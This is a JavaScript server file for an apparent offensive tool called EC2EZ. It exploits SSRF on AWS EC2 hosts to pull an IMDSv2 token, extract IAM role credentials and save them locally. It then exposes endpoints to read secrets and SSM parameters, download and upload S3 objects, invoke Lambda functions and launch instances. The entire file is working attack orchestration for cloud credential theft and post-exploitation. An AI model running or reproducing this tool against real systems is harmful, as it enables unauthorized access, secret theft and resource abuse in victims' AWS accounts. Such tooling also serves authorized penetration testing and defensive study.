import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

// Import EC2EZ modules
import * as imds from '../src/imds.js';
import * as aws from '../src/aws.js';
import * as permissions from '../src/permissions.js';
import * as s3discovery from '../src/s3discovery.js';
import { SessionSummary } from '../src/summary.js';
import { CONFIG } from '../src/config.js';
import { extractSSRFParam } from '../src/utils.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
  },
});

app.use(cors());
app.use(express.json());

// Session state
let currentSession = {
  summary: new SessionSummary(),
  proxyUrl: null,
  token: null,
  roles: [],
  permissions: null,
};

// Helper function to emit logs to UI
function emitLog(type, message, data = null) {
  const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
  io.emit('log', { type, message, data, timestamp });
  console.log(`[${type.toUpperCase()}] ${message}`);
}

// Start exploitation flow
app.post('/api/start', async (req, res) => {
  const { proxyUrl } = req.body;

  if (!proxyUrl) {
    return res.status(400).json({ error: 'Proxy URL is required' });
  }

  res.json({ status: 'started' });

  try {
    currentSession = {
      summary: new SessionSummary(),
      proxyUrl,
      token: null,
      roles: [],
      permissions: null,
    };

    // Auto-detect SSRF parameter name (same as CLI)
    const paramName = extractSSRFParam(proxyUrl);
    CONFIG.ssrf.paramName = paramName;
    emitLog('info', `Using SSRF parameter: ${paramName}`);

    io.emit('sessionUpdate', { proxyUrl });

    // Step 1: Test SSRF
    emitLog('info', 'Testing SSRF vulnerability...');
    const isVulnerable = await imds.testSSRFVulnerability(proxyUrl);
    if (!isVulnerable) {
      emitLog('error', 'SSRF vulnerability test failed');
      io.emit('exploitationComplete');
      return;
    }
    emitLog('success', '✓ SSRF vulnerability confirmed');

    // Step 2: Extract IMDSv2 Token
    emitLog('info', 'Extracting IMDSv2 token...');
    const token = await imds.fetchIMDSv2Token(proxyUrl);
    if (!token) {
      emitLog('error', 'Failed to extract IMDSv2 token');
      io.emit('exploitationComplete');
      return;
    }
    currentSession.token = token;
    emitLog('success', `✓ IMDSv2 token extracted (6-hour TTL)`);
    currentSession.summary.setIMDS({ token, totalMetadata: 0 });

    // Step 3: Enumerate IAM Roles
    emitLog('info', 'Enumerating IAM roles...');
    const roles = await imds.fetchAllIAMRoles(proxyUrl, token);
    if (!roles || roles.length === 0) {
      emitLog('warning', 'No IAM roles found on instance');
    } else {
      emitLog('success', `✓ Found ${roles.length} IAM role(s)`);
      currentSession.roles = roles;
    }

    // Step 4: Extract credentials for each role
    for (const role of roles) {
      emitLog('info', `Extracting credentials for role: ${role}`);
      const creds = await imds.fetchCredentials(proxyUrl, token, role);

      if (creds) {
        emitLog('success', `✓ Credentials extracted for ${role}`);
        currentSession.summary.addRole({
          name: role,
          accessKeyId: creds.AccessKeyId,
          secretAccessKey: creds.SecretAccessKey,
          token: creds.Token,
          expiration: creds.Expiration,
        });

        // Write credentials to file
        await imds.writeAWSCredentials(
          creds.AccessKeyId,
          creds.SecretAccessKey,
          creds.Token,
          CONFIG.aws.defaultRegion
        );

        // Validate credentials
        emitLog('info', 'Validating credentials...');
        const validation = await aws.validateCredentials(true);
        if (validation.valid) {
          emitLog('success', `✓ Credentials valid - Account: ${validation.accountId}`);
          currentSession.summary.setCredentials({
            extracted: true,
            valid: true,
            roleName: role,
            region: validation.region,
            accountId: validation.accountId,
          });

          io.emit('sessionUpdate', {
            accountId: validation.accountId,
            region: validation.region,
          });
        }
      }
    }

    // Step 5: Enumerate IMDS metadata
    emitLog('info', 'Enumerating IMDS metadata...');
    const metadata = await s3discovery.enumerateIMDSRecursive(proxyUrl, token, '/latest/meta-data');
    const metadataCount = Object.keys(metadata).length;
    emitLog('success', `✓ Discovered ${metadataCount} metadata entries`);
    currentSession.summary.setIMDS({ token, totalMetadata: metadataCount });

    // Step 6: Enumerate permissions
    emitLog('info', 'Enumerating IAM permissions...');
    const permResults = await permissions.discoverPermissionsByTesting();
    currentSession.permissions = permResults;
    emitLog('success', `✓ Discovered ${permResults.totalPermissions} permissions`);
    currentSession.summary.setPermissions({
      total: permResults.totalPermissions,
      discovered: permResults.allPermissions,
      dangerous: permResults.dangerousPermissionsList,
    });

    io.emit('sessionUpdate', {
      roles: currentSession.roles,
      permissions: permResults,
      metadata: metadataCount,
    });

    // Step 7: Test S3 access
    emitLog('info', 'Testing S3 access...');
    try {
      const s3Results = await s3discovery.testS3Access();
      if (s3Results.buckets && s3Results.buckets.length > 0) {
        emitLog('success', `✓ Found ${s3Results.buckets.length} accessible S3 buckets`);
      }
    } catch (error) {
      emitLog('warning', 'S3 access test failed');
    }

    emitLog('success', '🎉 Exploitation complete! Check other sections for details.');
    io.emit('exploitationComplete');
  } catch (error) {
    emitLog('error', `Exploitation failed: ${error.message}`);
    io.emit('exploitationComplete');
  }
});

// S3 Operations
app.get('/api/s3/buckets', async (req, res) => {
  try {
    const buckets = await aws.listS3Buckets();
    res.json({ buckets });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/s3/list-objects', async (req, res) => {
  try {
    const { bucket, prefix } = req.body;
    const objects = await aws.listS3Objects(bucket, prefix);
    res.json({ objects });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/s3/download', async (req, res) => {
  try {
    const { bucket, key, outputPath } = req.body;
    await aws.downloadS3Object(bucket, key, outputPath);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/s3/upload', async (req, res) => {
  try {
    const { localPath, bucket, key } = req.body;
    await aws.uploadS3Object(localPath, bucket, key);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Secrets Manager Operations
app.get('/api/secrets/list', async (req, res) => {
  try {
    const secrets = await aws.listSecrets();
    res.json({ secrets });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/secrets/get', async (req, res) => {
  try {
    const { secretName } = req.body;
    const value = await aws.getSecretValue(secretName);
    res.json({ value });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// SSM Operations
app.get('/api/ssm/parameters', async (req, res) => {
  try {
    const parameters = await aws.listSSMParameters();
    res.json({ parameters });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/ssm/get-parameter', async (req, res) => {
  try {
    const { paramName } = req.body;
    const value = await aws.getSSMParameter(paramName);
    res.json({ value });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/ssm/put-parameter', async (req, res) => {
  try {
    const { paramName, value, paramType } = req.body;
    await aws.createSSMParameter(paramName, value, paramType);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// IAM Operations
app.get('/api/iam/users', async (req, res) => {
  try {
    const users = await aws.listIAMUsers();
    res.json({ users });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/iam/roles', async (req, res) => {
  try {
    const roles = await aws.listIAMRoles();
    res.json({ roles });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Lambda Operations
app.get('/api/lambda/functions', async (req, res) => {
  try {
    const functions = await aws.listLambdaFunctions();
    res.json({ functions });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/lambda/invoke', async (req, res) => {
  try {
    const { functionName, payload } = req.body;
    const result = await aws.invokeLambda(functionName, payload);
    res.json({ result });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// EC2 Operations
app.get('/api/ec2/instances', async (req, res) => {
  try {
    const instances = await aws.listEC2Instances();
    res.json({ instances });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/ec2/launch', async (req, res) => {
  try {
    const instance = await aws.launchEC2Instance();
    res.json({ instance });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// CloudWatch Operations
app.get('/api/cloudwatch/log-groups', async (req, res) => {
  try {
    const { listLogGroups } = await import('../src/cloudwatch.js');
    const logGroups = await listLogGroups();
    res.json({ logGroups });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/cloudwatch/scan', async (req, res) => {
  try {
    const { logGroupName, hours, maxLogs } = req.body;
    const { scanCloudWatchLogs } = await import('../src/cloudwatch.js');
    const results = await scanCloudWatchLogs(logGroupName, hours, maxLogs);
    res.json({ results });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get session summary
app.get('/api/summary', (req, res) => {
  res.json({
    summary: currentSession.summary.findings,
  });
});

// WebSocket connection
io.on('connection', (socket) => {
  console.log('Client connected');
  socket.emit('log', {
    type: 'info',
    message: 'Connected to EC2EZ server',
    timestamp: new Date().toISOString().split('T')[1].split('.')[0],
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected');
  });
});

const PORT = process.env.PORT || 3006;
httpServer.listen(PORT, () => {
  console.log(`EC2EZ Server running on http://localhost:${PORT}`);
});
